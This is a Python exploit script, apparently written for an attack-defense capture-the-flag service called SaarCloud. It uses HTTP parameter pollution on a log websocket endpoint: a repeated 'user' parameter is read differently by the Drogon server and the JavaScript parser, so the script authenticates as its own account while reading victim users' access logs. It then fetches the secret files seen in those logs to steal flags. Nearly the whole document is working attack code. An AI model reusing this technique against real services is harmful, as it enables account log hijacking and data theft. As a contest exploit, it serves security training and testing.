import os
import random
import re
import string
import threading
import socket

import requests
import sys
import time
import websocket


"""
Flag is stored in a file with secret name. Name is not stored anywhere, but the gameserver comes along at some point and retrieves it.

Access log endpoint is vulnerable to multiple HTTP parameters. 
Drogon picks the last occurence of a parameter, the JS parser picks the first one.
We authenticate against our own account with valid token from JS view, but against victim account from drogon's view.

Then we wait for the gameserver to access the secret URL, see it in access log, and retrieve the flag.
"""


def wait_for_checker_to_retrieve_flags(target):
    """
    In our CI environment, the environment variable "CHECKER_RETRIEVE_CMD" triggers the checker to retrieve flags again
    (for exploits that catch the flag in-flight).
    """
    print('-' * 80)
    print('waiting for checker ...')
    sys.stdout.flush()
    if 'CHECKER_RETRIEVE_CMD' in os.environ:
        os.system(os.environ['CHECKER_RETRIEVE_CMD'] + " 2>&1 | tac | tac | sed 's/SAAR{/SAAR_/'")
    else:
        # Trigger the regular checker script with some parameters (adjust for your own testing)
        os.system(f"PYTHONPATH=../ python3 -u ../checkers/saarcloud.py '{target}' retrieve")
    print('-' * 80)


def random_string(l=12):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(l))


class SaarCloudSession(requests.Session):
    def __init__(self, ip: str, hostname='default'):
        super().__init__()
        if hostname == 'default':
            hostname = 'www'
        if '.' not in ip:
            ip = socket.gethostbyname(ip)
        self.base = f'http://{hostname}.{ip}.nip.io:8080'
        self.ip = ip

    def get(self, url, **kwargs):
        if url.startswith('/'):
            url = self.base + url
        return super().get(url, **kwargs)

    def post(self, url, **kwargs):
        if url.startswith('/'):
            url = self.base + url
        return super().post(url, **kwargs)


def exploit(target):
    session = SaarCloudSession(target)
    # We attack users relying on "cdn"
    users = session.get('/api/featured').json()['cdn']

    # Register a new user
    username = random_string()
    token = session.post('/api/register/cdn', json={'username': username}).json()['log_token']

    # Handle opened websockets - once we see a log entry from the game server, we open the same file
    already_seen = set()

    def fetch_file(ws, msg):
        if '/paid_content_' in msg:
            # fetch the file ourselves
            match = re.search(r'"GET /([a-z0-9]+)/([a-zA-Z0-9_.]+)"', msg)
            if (match.group(1), match.group(2)) not in already_seen:
                already_seen.add((match.group(1), match.group(2)))
                print('LOG:', msg)
                session = SaarCloudSession(target, match.group(1))
                print(session.get('/' + match.group(2)).text)
                sys.stdout.flush()

    # Use HTTP Parameter Pollution to get a websocket of the user
    for user in users:
        app = websocket.WebSocketApp(f'ws://www.{session.ip}.nip.io:8080/logs?user={username}&token={token}&user={user["name"]}', on_message=fetch_file)
        threading.Thread(target=lambda: app.run_forever(), daemon=True).start()

    # Wait until secret files are retrieved
    wait_for_checker_to_retrieve_flags(target)

    time.sleep(2)


if __name__ == '__main__':
    exploit(sys.argv[1] if len(sys.argv) > 1 else '127.1.0.1')
